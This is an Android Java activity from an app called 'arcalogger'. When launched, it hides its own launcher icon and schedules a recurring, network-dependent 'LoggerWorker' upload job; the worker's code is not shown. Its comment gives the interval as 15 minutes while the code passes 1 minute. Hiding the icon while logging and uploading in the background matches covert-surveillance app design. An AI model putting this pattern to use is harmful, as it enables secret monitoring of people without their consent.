package ng.mathemandy.arcalogger.ui;

import androidx.appcompat.app.AppCompatActivity;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;

import kotlinx.coroutines.Dispatchers;
import ng.mathemandy.arcalogger.R;
import ng.mathemandy.arcalogger.workmanager.LoggerWorker;

import java.util.concurrent.TimeUnit;

import static kotlinx.coroutines.CoroutineScopeKt.CoroutineScope;

public class SplashActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        hideAppLaunchIcon();
        runWorker();
    }

    void hideAppLaunchIcon() {
        PackageManager p = getPackageManager();
        ComponentName name = new ComponentName(this, SplashActivity.class);
        p.setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void runWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        // Create periodic worker with contraints & 15 minutes interval
        PeriodicWorkRequest uploadWorker = new PeriodicWorkRequest.Builder(
                LoggerWorker.class, 1, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueue(uploadWorker);
    }


}